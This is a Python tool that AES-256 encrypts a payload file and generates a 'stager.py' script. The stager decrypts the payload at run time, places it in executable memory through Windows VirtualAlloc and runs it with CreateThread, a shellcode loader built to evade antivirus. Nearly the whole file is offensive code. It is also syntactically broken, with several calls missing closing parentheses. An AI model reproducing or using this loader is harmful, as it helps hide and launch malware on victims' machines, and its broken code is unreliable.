# encrypt_payload.py
# Usage: python encrypt_payload.py -i <input_file> -o <encrypted_file> [-k <32_byte_key>]

import argparse
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad
import os

STAGER_TEMPLATE = '''# stager.py
# Usage: python stager.py

import ctypes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_payload(encrypted_file, key):
    with open(encrypted_file, 'rb') as f:
        data = f.read()
    iv = data[:16]
    ciphertext = data[16:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(ciphertext)
    return unpad(decrypted, AES.block_size)

def run_payload(payload):
    # Allocate RWX memory
    ptr = ctypes.windll.kernel32.VirtualAlloc(
        ctypes.c_int(0),
        ctypes.c_int(len(payload)),
        ctypes.c_int(0x3000),  # MEM_COMMIT | MEM_RESERVE
        ctypes.c_int(0x40)     # PAGE_EXECUTE_READWRITE
    )
    
    # Copy payload to memory
    buf = (ctypes.c_char * len(payload)).from_buffer(payload)
    ctypes.windll.kernel32.RtlMoveMemory(
        ctypes.c_int(ptr),
        buf,
        ctypes.c_int(len(payload))
    
    # Create and execute thread
    thread = ctypes.windll.kernel32.CreateThread(
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.c_int(ptr),
        ctypes.c_int(0),
        ctypes.c_int(0),
        ctypes.pointer(ctypes.c_int(0))
    
    # Wait for thread completion
    ctypes.windll.kernel32.WaitForSingleObject(
        ctypes.c_int(thread),
        ctypes.c_int(-1))

if __name__ == '__main__':
    key = {key_bytes}
    encrypted_file = '{encrypted_file}'
    try:
        decrypted_payload = decrypt_payload(encrypted_file, key)
        run_payload(decrypted_payload)
    except Exception as e:
        print("Error:", e)
'''

def encrypt_file(input_file, output_file, key=None):
    # Generate key if not provided
    if key is None:
        key = os.urandom(32)
    elif len(key) != 32:
        raise ValueError("Key must be 32 bytes long")
    
    # Generate random IV
    iv = os.urandom(16)
    
    # Read and encrypt payload
    with open(input_file, 'rb') as f:
        plaintext = f.read()
    
    cipher = AES.new(key, AES.MODE_CBC, iv)
    ciphertext = cipher.encrypt(pad(plaintext, AES.block_size))
    
    # Write IV + ciphertext
    with open(output_file, 'wb') as f:
        f.write(iv + ciphertext)
    
    # Generate stager with embedded key
    stager_code = STAGER_TEMPLATE.format(
        key_bytes=repr(key),
        encrypted_file=os.path.basename(output_file)
    
    with open('stager.py', 'w') as f:
        f.write(stager_code)
    
    print(f"[+] Payload encrypted successfully to {output_file}")
    print(f"[+] Stager saved to stager.py")
    if key is not None:
        print(f"[+] Encryption key: {key.hex()}")

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='AES-256 payload encryptor')
    parser.add_argument('-i', '--input', required=True, help='Input payload file')
    parser.add_argument('-o', '--output', required=True, help='Output encrypted file')
    parser.add_argument('-k', '--key', help='32-byte encryption key (hex)')
    
    args = parser.parse_args()
    
    key = None
    if args.key:
        try:
            key = bytes.fromhex(args.key)
            if len(key) != 32:
                raise ValueError("Key must be 32 bytes (64 hex characters)")
        except ValueError as e:
            print(f"Error: {e}")
            exit(1)
    
    try:
        encrypt_file(args.input, args.output, key)
    except Exception as e:
        print(f"Error: {e}")
        exit(1)
